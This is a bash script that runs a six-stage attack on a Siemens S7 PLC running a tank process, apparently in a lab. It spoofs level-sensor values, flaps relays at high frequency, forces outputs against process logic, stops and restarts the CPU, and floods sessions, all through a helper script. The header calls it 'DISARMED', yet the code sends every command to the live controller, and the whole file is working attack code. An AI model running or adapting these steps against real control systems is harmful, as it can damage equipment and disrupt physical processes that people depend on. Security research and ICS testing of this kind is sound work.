#!/bin/bash
# kali_evil.sh — DISARMED worst-case devastation battery on the live PLC1 tank (MAX intensity, accepts relay wear).
# Runtime carnage only — deliberately does NOT touch the PLC program/firmware.
# Kali:    bash kali_evil.sh
# Dell#1:  sudo ip netns exec opns env PY=/usr/bin/python3 S7=/home/msclab/s7_write.py bash /home/msclab/kali_evil.sh
PY="${PY:-python3}"; HOST="${HOST:-192.168.2.10}"; S7="${S7:-$HOME/s7_write.py}"
bang(){ echo; echo "############ $(date +%H:%M:%S)  $1"; }

bang "STAGE 1  SENSOR CHAOS — pin Level LOW(0) then HIGH(100) then rapid oscillation"
$PY "$S7" --host "$HOST" --dbspoof --db 7 --offset 0 --spoofval 0   --secs 6 --hz 20
$PY "$S7" --host "$HOST" --dbspoof --db 7 --offset 0 --spoofval 100 --secs 6 --hz 20
for i in $(seq 1 40); do
  $PY "$S7" --host "$HOST" --dbspoof --db 7 --offset 0 --spoofval 0   --count 1 >/dev/null 2>&1
  $PY "$S7" --host "$HOST" --dbspoof --db 7 --offset 0 --spoofval 100 --count 1 >/dev/null 2>&1
done

bang "STAGE 2  RELAY FLICKER — violent output flap (HARDWARE STRESS)"
$PY "$S7" --host "$HOST" --flap --secs 20 --hz 20

bang "STAGE 3  OUTPUT FORCING — storm-write Q0.3 ON then OFF against process logic"
$PY "$S7" --host "$HOST" --storm --val 8 --secs 8 --hz 20
$PY "$S7" --host "$HOST" --storm --val 0 --secs 8 --hz 20

bang "STAGE 4  CPU STOP/START ABUSE — halt & resume the running process x2"
$PY "$S7" --host "$HOST" --stop;  sleep 4
$PY "$S7" --host "$HOST" --start; sleep 3
$PY "$S7" --host "$HOST" --stop;  sleep 4
$PY "$S7" --host "$HOST" --start; sleep 3

bang "STAGE 5  SESSION FLOOD — read-storm resource exhaustion"
$PY "$S7" --host "$HOST" --readstorm --secs 10 --hz 40

bang "STAGE 6  GRAND FINALE — sensor + relay flap + output storm ALL AT ONCE"
$PY "$S7" --host "$HOST" --dbspoof --db 7 --offset 0 --spoofval 0 --secs 15 --hz 20 &
$PY "$S7" --host "$HOST" --flap --secs 15 --hz 20 &
$PY "$S7" --host "$HOST" --storm --val 8 --secs 15 --hz 20 &
wait

bang "END — ensure CPU is RUNNING again"
$PY "$S7" --host "$HOST" --start >/dev/null 2>&1
echo "==> battery complete."
